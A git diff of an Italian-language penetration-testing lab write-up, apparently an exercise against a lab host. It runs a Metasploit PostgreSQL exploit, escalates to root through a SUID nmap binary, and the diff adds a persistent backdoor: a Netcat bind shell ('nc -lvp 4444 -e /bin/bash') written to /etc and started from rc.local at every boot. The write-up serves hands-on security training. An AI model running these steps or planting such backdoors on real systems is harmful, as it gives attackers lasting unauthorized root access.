@@ -7,6 +7,7 @@ L'obiettivo è stato raggiunto attraverso un approccio sistematico e ben documen
 - Configurazione dell'exploit PostgreSQL per ottenere una sessione iniziale Meterpreter.
 - Verifica della presenza di binari vulnerabili con il bit SUID attivo.
 - Escalation manuale a root sfruttando `nmap` in modalità interattiva.
+- Installazione di una **backdoor persistente** con Netcat compatibile con sistemi a **32 bit**.
 
 ---
 
@@ -28,12 +29,8 @@ Per ottenere una sessione Meterpreter:
 msfconsole
 use exploit/linux/postgres/postgres_payload
 set RHOSTS 192.168.50.3
-set LHOST 192.168.50.2
 exploit
 ```
-
-![Porcamadonna](./MeterpreterOK.png)
-
 - **Risultato:** Abbiamo ottenuto una sessione Meterpreter come utente **postgres**.
 
 ### **3. Verifica dei privilegi e binari vulnerabili**
@@ -61,12 +58,34 @@ Abbiamo sfruttato manualmente `nmap` per ottenere una shell root:
    ```
 - **Risultato:** Utente elevato a **root**.
 
+![Meterpreter](./MeterpreterOK.png)
+
+### **5. Installazione della backdoor persistente con Netcat**
+Per ottenere una connessione persistente root su ogni avvio del sistema target:
+1. Creazione dello script di backdoor:
+   ```bash
+   echo '#!/bin/bash' > /etc/backdoor_nc.sh
+   echo 'nc -lvp 4444 -e /bin/bash' >> /etc/backdoor_nc.sh
+   chmod +x /etc/backdoor_nc.sh
+   ```
+2. Aggiunta della backdoor all'avvio del sistema tramite `rc.local`:
+   ```bash
+   echo '/etc/backdoor_nc.sh &' >> /etc/rc.local
+   chmod +x /etc/rc.local
+   ```
+3. Verifica del contenuto di `rc.local`:
+   ```bash
+   cat /etc/rc.local
+   ```
+- **Risultato:** La backdoor verrà eseguita automaticamente ad ogni avvio del sistema, aprendo una connessione Netcat sulla porta `4444`.
+
 ---
 
 ## 🎯 **Risultati ottenuti**
 - **Accesso iniziale:** Sessione Meterpreter come utente `postgres`.
 - **Escalation di privilegi:** Eseguita con successo sfruttando `nmap` con bit SUID.
 - **Privilegi finali:** Shell root sul sistema target.
+- **Backdoor persistente:** Configurata tramite Netcat per una connessione automatica ad ogni avvio.
 
 ---
 
@@ -74,11 +93,12 @@ Abbiamo sfruttato manualmente `nmap` per ottenere una shell root:
 - **Metasploit Framework:** Per lanciare l'exploit PostgreSQL e ottenere l'accesso iniziale.
 - **Nmap (SUID):** Sfruttato manualmente per ottenere root.
 - **Linux Shell:** Per l'esecuzione di comandi manuali post-escalation.
+- **Netcat:** Utilizzato per creare una backdoor persistente con supporto a 32 bit.
 
 ---
 
 ## 📌 **Considerazioni finali**
 Questa esercitazione ha dimostrato l'importanza di combinare strumenti automatizzati (come Metasploit) con tecniche manuali per sfruttare vulnerabilità note. L'escalation di privilegi tramite `nmap` evidenzia come l'errata configurazione dei permessi possa essere sfruttata per ottenere il controllo completo di un sistema target.
 
-**Nota:** La persistenza non è stata implementata in questa fase e sarà configurata successivamente utilizzando msfvenom.
+La backdoor persistente con Netcat consente di mantenere l'accesso root in modo stabile e automatico, semplificando la fase post-exploitation.
 
